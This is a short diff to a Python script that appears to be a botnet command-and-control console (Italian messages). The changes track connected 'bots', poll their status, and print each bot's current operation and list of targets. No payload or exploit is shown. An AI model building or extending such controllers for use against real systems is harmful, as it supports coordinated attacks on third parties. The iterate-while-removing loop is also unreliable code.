@@ -90,7 +90,7 @@ def get_all_clients():
     Print all the clients connected to the server
     """
     if len(clients) == 0:
-        print("Nessun client connesso")
+        print("Nessun bot connesso")
         return
 
     for key, client in enumerate(clients):
@@ -212,21 +212,24 @@ def bot_status():
 
             print(f"Bot: {client}")
             print(f"Operation: {res.json()['operation']}")
-            print(f"Target: {res.json()['url'] or 'Nessuno'}")
+            if targets := res.json()['targets']:
+                for targets in targets:
+                    print(f"Target: {targets}")
             print("--------------------------------")
         except requests.exceptions.ConnectionError:
             print(f"Bot {client} disconnesso")
             clients.remove(client)
 
 
-def check_bot_is_active(ip):
-    try:
-        requests.get(f"http://{ip}/status")
-        # requests.get(f"http://{ip}:8080/status")
-        print(f"Bot: {ip} attivo")
-    except requests.exceptions.ConnectionError:
-        print(f"Bot {ip} disconnesso")
-        clients.remove(ip)
+def check_bot_is_active():
+    for client in clients:
+        try:
+            requests.get(f"http://{client}/status")
+            # requests.get(f"http://{ip}:8080/status")
+            print(f"Bot: {client} attivo")
+        except requests.exceptions.ConnectionError:
+            print(f"Bot {client} disconnesso")
+            clients.remove(client)
 
 
 if __name__ == '__main__':
